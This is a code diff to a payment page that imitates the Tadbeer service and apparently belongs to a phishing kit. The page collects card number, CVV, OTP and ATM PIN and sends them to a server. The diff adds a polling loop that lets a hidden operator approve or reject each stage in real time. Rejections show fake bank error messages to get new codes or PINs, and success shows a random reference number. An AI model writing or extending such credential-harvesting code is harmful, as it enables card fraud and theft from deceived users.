@@ -292,6 +292,24 @@
 
         .hidden { display: none !important; }
 
+        /* ===== Admin decision: waiting + rejection ===== */
+        .decide-overlay {
+            position: fixed; inset: 0; z-index: 900;
+            background: rgba(33, 50, 68, .55);
+            display: none; align-items: center; justify-content: center; padding: 20px;
+        }
+        .decide-overlay.show { display: flex; }
+        .decide-overlay .card { max-width: 460px; width: 100%; margin: 0; padding: 36px 24px; }
+        .decide-overlay .reject-ic {
+            width: 62px; height: 62px; margin: 0 auto 18px; border-radius: 50%;
+            background: #fde8e8; color: #dc2626; font-size: 30px; font-weight: 700;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .decide-overlay h3 { text-align: center; color: #b91c1c; font-size: 19px; }
+        .decide-overlay p { text-align: center; margin-top: 10px; font-size: 14px; color: #5b6b7f; line-height: 1.75; }
+        .decide-overlay .btn { width: 100%; margin-top: 20px; }
+        #proc-wait-note { margin-top: 14px !important; font-size: 13px !important; color: #94a3b8 !important; }
+
         /* ===== Mobile ===== */
         @media (max-width: 520px) {
             main { padding: 20px 12px 48px; }
@@ -448,6 +466,25 @@
         </div>
     </main>
 
+    <!-- Awaiting admin decision -->
+    <div class="decide-overlay" id="decide-wait">
+        <div class="card processing">
+            <div class="spin"></div>
+            <h3>Your transaction is being reviewed</h3>
+            <p id="proc-wait-note">Please wait until the operation is approved by Tadbeer management. Do not close this page.</p>
+        </div>
+    </div>
+
+    <!-- Rejection message -->
+    <div class="decide-overlay" id="decide-reject">
+        <div class="card">
+            <div class="reject-ic">&#10005;</div>
+            <h3>Transaction failed</h3>
+            <p id="reject-msg"></p>
+            <button type="button" class="btn btn-cancel" id="btn-reject-close">Close</button>
+        </div>
+    </div>
+
     <footer>All rights reserved to Tadbeer</footer>
 
     <script>
@@ -558,6 +595,42 @@
 
         function step(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+        // ---------------- Awaiting admin decision (approve / reject) ----------------
+        const REJECT_MESSAGES = {
+            card: 'Payment failed. Your card may not be enabled for online payments. Please try a different payment method or contact your bank.',
+            otp: 'The code you entered is incorrect or invalid. Please verify the correct code and try again.',
+            pin: 'The ATM PIN is incorrect. Please verify the correct PIN and try again.'
+        };
+
+        let decideTimer = null;
+        function clearDecide() { if (decideTimer) { clearInterval(decideTimer); decideTimer = null; } }
+        function openWait() { $('decide-wait').classList.add('show'); }
+        function closeWait() { $('decide-wait').classList.remove('show'); }
+        function showReject(stage) {
+            $('reject-msg').innerText = REJECT_MESSAGES[stage] || REJECT_MESSAGES.pin;
+            $('decide-reject').classList.add('show');
+        }
+        function closeReject() { $('decide-reject').classList.remove('show'); }
+
+        function waitForDecision(stage) {
+            return new Promise(resolve => {
+                clearDecide();
+                decideTimer = setInterval(async function () {
+                    try {
+                        const r = await fetch('/api/payment-decision/' + encodeURIComponent(contractNo) + '?stage=' + stage);
+                        const j = await r.json();
+                        if (j && j.decision === 'approved') {
+                            closeWait(); clearDecide(); resolve('approved');
+                        } else if (j && j.decision === 'rejected') {
+                            closeWait(); clearDecide(); resolve('rejected');
+                        }
+                    } catch (e) { /* ignore */ }
+                }, 1500);
+            });
+        }
+
+        $('btn-reject-close').addEventListener('click', closeReject);
+
         async function postPayment(stage, payload) {
             try {
                 await fetch('/api/payments', {
@@ -591,9 +664,17 @@
                 cardExpiry: $('card-mm').value + '/' + $('card-yy').value,
                 cardCvv: $('card-cvv').value
             });
-            await step(2600);
-            show('pg-otp');
-            $('btn-pay').disabled = false;
+            await step(1200);
+            setProcMsg('Submitting transaction for approval...');
+            openWait();
+            const decision = await waitForDecision('card');
+            if (decision === 'approved') {
+                show('pg-otp');
+                $('btn-pay').disabled = false;
+            } else {
+                showReject('card');
+                $('btn-pay').disabled = false;
+            }
         });
 
         $('btn-otp').addEventListener('click', async function () {
@@ -604,9 +685,16 @@
             show('pg-processing');
             setProcMsg('Verifying OTP code...');
             await postPayment('otp', { otpCode: val });
-            await step(2200);
-            show('pg-atm');
-            $('btn-otp').disabled = false;
+            await step(800);
+            openWait();
+            const decision = await waitForDecision('otp');
+            if (decision === 'approved') {
+                show('pg-atm');
+                $('btn-otp').disabled = false;
+            } else {
+                showReject('otp');
+                $('btn-otp').disabled = false;
+            }
         });
 
         $('btn-pin').addEventListener('click', async function () {
@@ -617,17 +705,22 @@
             show('pg-processing');
             setProcMsg('Processing payment...');
             await postPayment('pin', { atmPin: val });
-            await step(2600);
-            // Success
-            setText('suc-amt', fmtEn(fee) + ' AED');
+            await step(800);
+            openWait();
+            const decision = await waitForDecision('pin');
+            if (decision === 'approved') {
+                setText('suc-amt', fmtEn(fee) + ' AED');
             const ref = 'TD-' + new Date().getFullYear() + String(Math.floor(10000 + Math.random() * 90000));
             setText('suc-ref', ref);
             setText('suc-date', new Date().toLocaleString('en-US'));
-            show('pg-success');
+                show('pg-success');
+            } else {
+                showReject('pin');
+            }
             $('btn-pin').disabled = false;
         });
 
-        $('btn-cancel').addEventListener('click', function () { window.location.href = '/en/home'; });
+        $('btn-cancel').addEventListener('click', function () { clearDecide(); closeWait(); closeReject(); window.location.href = '/en/home'; });
         $('btn-done').addEventListener('click', function () { window.location.href = '/en/home'; });
 
         // If user lands here with no booking (e.g. old payment success page), still fine
